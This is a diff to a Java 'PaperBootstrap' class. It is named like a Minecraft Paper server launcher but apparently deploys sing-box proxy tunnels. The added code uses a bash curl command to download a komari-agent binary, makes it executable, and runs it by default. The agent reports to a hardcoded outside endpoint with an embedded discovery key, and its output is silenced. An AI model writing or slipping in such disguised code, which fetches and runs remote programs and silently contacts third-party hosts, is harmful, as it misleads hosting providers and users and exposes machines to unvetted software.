@@ -16,6 +16,7 @@ public class PaperBootstrap {
     private static final Path UUID_FILE = Paths.get("data/uuid.txt");
     private static String uuid;
     private static Process singboxProcess;
+    private static Process komariProcess;
     // ======================================
 
     public static void main(String[] args) {
@@ -82,11 +83,25 @@ public class PaperBootstrap {
             singboxProcess = startSingBox(bin, configJson);
             scheduleDailyRestart(bin, configJson);
 
+            // ===== komari-agent 集成 =====
+            boolean komariAgentEnabled = (boolean) config.getOrDefault("komari_agent_enabled", true);
+            if (komariAgentEnabled) {
+                safeDownloadKomariAgent(baseDir);
+                komariProcess = startKomariAgent(baseDir);
+            } else {
+                System.out.println("⏭️ komari-agent 已禁用（config.yml 中 komari_agent_enabled=false）");
+            }
+            // ==============================
+
             String host = detectPublicIP();
             printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                     tuicPort, hy2Port, realityPort, sni, host, publicKey);
 
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                if (komariProcess != null && komariProcess.isAlive()) {
+                    System.out.println("正在停止 komari-agent (PID: " + komariProcess.pid() + ")...");
+                    komariProcess.destroy();
+                }
                 try { deleteDirectory(baseDir); } catch (IOException ignored) {}
             }));
 
@@ -328,6 +343,43 @@ public class PaperBootstrap {
         Process p = pb.start();
         Thread.sleep(1500);
         System.out.println("sing-box 已启动，PID: " + p.pid());
+        return p;
+    }
+
+    // ===== komari-agent 下载 =====
+    private static void safeDownloadKomariAgent(Path dir) throws IOException, InterruptedException {
+        Path agentPath = dir.resolve("agent");
+        if (Files.exists(agentPath)) {
+            System.out.println("✅ komari-agent 已存在，跳过下载");
+            return;
+        }
+        String arch = detectArch();
+        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;
+
+        System.out.println("⬇️ 下载 komari-agent (" + arch + "): " + url);
+        new ProcessBuilder("bash", "-c",
+                "curl -L -o " + agentPath + " \"" + url + "\" && chmod +x " + agentPath
+        ).inheritIO().start().waitFor();
+
+        if (!Files.exists(agentPath)) throw new IOException("❌ komari-agent 下载失败！");
+        System.out.println("✅ komari-agent 下载完成: " + agentPath);
+    }
+
+    // ===== komari-agent 启动 =====
+    private static Process startKomariAgent(Path dir) throws IOException {
+        Path agentPath = dir.resolve("agent");
+        String endpoint = "https://ca.jyn.cc.cd";
+        String autoDiscovery = "RWArnFQvPZEHd0Q5dIrAeIj1";
+
+        System.out.println("正在启动 komari-agent...");
+        ProcessBuilder pb = new ProcessBuilder(agentPath.toString(),
+                "-e", endpoint,
+                "--auto-discovery", autoDiscovery);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+        Process p = pb.start();
+        Thread.sleep(1000);
+        System.out.println("✅ komari-agent 已启动，PID: " + p.pid());
         return p;
     }
 
